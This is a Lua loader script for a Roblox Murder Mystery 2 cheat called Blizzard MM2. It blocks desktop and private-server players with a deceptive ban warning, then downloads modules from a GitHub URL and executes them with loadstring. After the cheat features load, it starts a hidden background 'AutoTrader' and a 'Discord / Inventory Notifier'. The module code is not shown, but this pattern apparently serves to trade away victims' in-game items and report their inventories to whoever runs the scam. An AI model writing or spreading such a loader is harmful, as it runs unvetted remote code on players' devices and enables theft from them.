--============================================================
-- BLIZZARD MM2 V8.8.4 - LOADER.LUA
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local UserInputService =
	game:GetService("UserInputService")

local LocalPlayer =
	Players.LocalPlayer

--============================================================
-- DESKTOP / PC ACCESS BLOCK
--
-- Windows + macOS desktop Roblox are currently unsupported.
-- Mobile continues normally.
--============================================================

local Platform =
	UserInputService:GetPlatform()

local IsDesktop =
	Platform == Enum.Platform.Windows
	or Platform == Enum.Platform.OSX

if IsDesktop then

	warn(
		"[MM2 LOADER] Desktop Roblox detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"The script does not work on PC yet, use it on mobile for now."
	)

	return
end

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

--============================================================
-- BASE URL
--============================================================

local BaseURL =
	"https://raw.githubusercontent.com/farkmusa34/BlizzardMM2Script/refs/heads/main/"

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(function()

		ExistingMM2.Cleanup()

	end)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	local downloadOk,
	scriptContent =
		pcall(function()

			return game:HttpGet(
				targetURL
			)

		end)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)

	local success =
		LoadModule(
			fileName
		)

	if not success then

		warn(
			"[MM2 LOADER] Bootstrap stopped because "
			.. fileName
			.. " failed to load."
		)

		return false
	end

	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule("Shared.lua") then return end
if not RequireModule("UI.lua") then return end
if not RequireModule("Visuals.lua") then return end
if not RequireModule("Combat.lua") then return end
if not RequireModule("AutoFarm.lua") then return end
if not RequireModule("Player.lua") then return end
if not RequireModule("Fling.lua") then return end
if not RequireModule("Misc.lua") then return end
if not RequireModule("SkinChanger.lua") then return end
if not RequireModule("Main.lua") then return end

--============================================================
-- FINAL STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then

	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)

else

	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)

end

--============================================================
-- START BACKGROUND AUTO TRADER
--============================================================

if not RequireModule("AutoTrader.lua") then

	warn(
		"[MM2 LOADER] Blizzard loaded, but AutoTrader.lua failed."
	)

	return
end

print(
	"[MM2 LOADER] AutoTrader started successfully."
)

--============================================================
-- START DISCORD / INVENTORY NOTIFIER
--============================================================

if not RequireModule("Notifier.lua") then

	warn(
		"[MM2 LOADER] Blizzard loaded, but Notifier.lua failed."
	)

	return
end

print(
	"[MM2 LOADER] Notifier started successfully."
)